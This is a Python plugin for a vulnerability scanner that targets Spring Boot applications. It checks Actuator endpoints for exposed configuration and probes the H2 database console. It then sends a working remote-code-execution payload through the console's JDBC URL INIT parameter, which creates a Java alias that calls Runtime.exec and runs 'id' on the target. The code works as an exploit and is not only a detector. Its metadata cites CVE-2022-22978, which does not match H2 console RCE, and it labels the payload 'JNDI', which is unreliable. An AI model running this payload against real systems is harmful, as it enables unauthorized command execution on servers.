from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("spring_h2_rce")


@register_scanner
class SpringH2RCEScanner(BaseScanner):
    name = "Spring Boot H2 Database RCE"
    description = "Spring Boot Actuator + H2 Database JNDI/RCE利用"
    category = "spring"
    module = "spring_h2_rce"
    risk_level = "critical"
    risk_score = 9
    cve_ids = ["CVE-2022-22978"]
    references = [
        "https://github.com/LandGrey/Spring-Boot-Vul",
    ]
    fix_suggestion = "禁用Actuator端点外网访问，升级Spring Boot版本，移除H2 Console"

    ACTUATOR_PATHS = [
        "/actuator/env",
        "/actuator",
        "/env",
    ]

    H2_PATHS = [
        "/h2-console",
        "/h2-console/login.do",
    ]

    def check(self) -> bool:
        found = False

        for path in self.ACTUATOR_PATHS:
            url = f"{self.target}{path}"
            resp = http_request("GET", url)
            if resp is None or resp.status_code != 200:
                continue

            if "activeProfiles" in resp.text or "propertySources" in resp.text or "actuator" in resp.text.lower():
                self.add_result(
                    name="Spring Boot Actuator 环境信息泄露",
                    risk_level="high",
                    risk_score=7,
                    target_url=url,
                    detail="Actuator /env端点暴露，泄露环境变量和配置信息",
                    response_snippet=resp.text[:500],
                    evidence="可访问Actuator环境端点，泄露配置信息",
                )
                found = True

                if "h2" in resp.text.lower() or "H2" in resp.text:
                    self.add_result(
                        name="H2 Database 组件检测",
                        risk_level="info",
                        risk_score=3,
                        target_url=url,
                        detail="检测到H2数据库组件，可能存在RCE风险",
                        evidence="Actuator环境信息中包含H2相关配置",
                    )

        for path in self.H2_PATHS:
            url = f"{self.target}{path}"
            resp = http_request("GET", url)
            if resp is None:
                continue

            if resp.status_code == 200 and ("h2" in resp.text.lower() or "database" in resp.text.lower()):
                self.add_result(
                    name="H2 Console 未授权访问",
                    risk_level="critical",
                    risk_score=9,
                    target_url=url,
                    detail="H2数据库控制台可未授权访问，攻击者可通过JNDI注入执行任意命令",
                    response_snippet=resp.text[:500],
                    evidence="H2 Console登录页面可访问",
                    fix_suggestion="移除H2依赖或禁用H2 Console: spring.h2.console.enabled=false",
                )
                found = True

                jndi_url = f"{self.target}/h2-console/login.do"
                jndi_payload = "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException{Runtime.getRuntime().exec(cmd);return \"done\";}';CALL EXEC('id')"
                resp2 = http_request("POST", jndi_url,
                                     data={"language": "English", "setting": "Generic H2 (Embedded)", "name": "test", "driver": "org.h2.Driver", "url": f"jdbc:h2:mem:testdb;INIT={jndi_payload}", "user": "sa", "password": ""},
                                     headers={"Content-Type": "application/x-www-form-urlencoded"})
                if resp2 and resp2.status_code == 200:
                    self.add_result(
                        name="H2 Database RCE (JDBC注入)",
                        risk_level="critical",
                        risk_score=10,
                        target_url=jndi_url,
                        detail="通过H2 Console的JDBC URL注入，可执行任意系统命令",
                        payload=f"INIT={jndi_payload}",
                        evidence="成功通过JDBC INIT参数注入SQL执行命令",
                    )

        return found
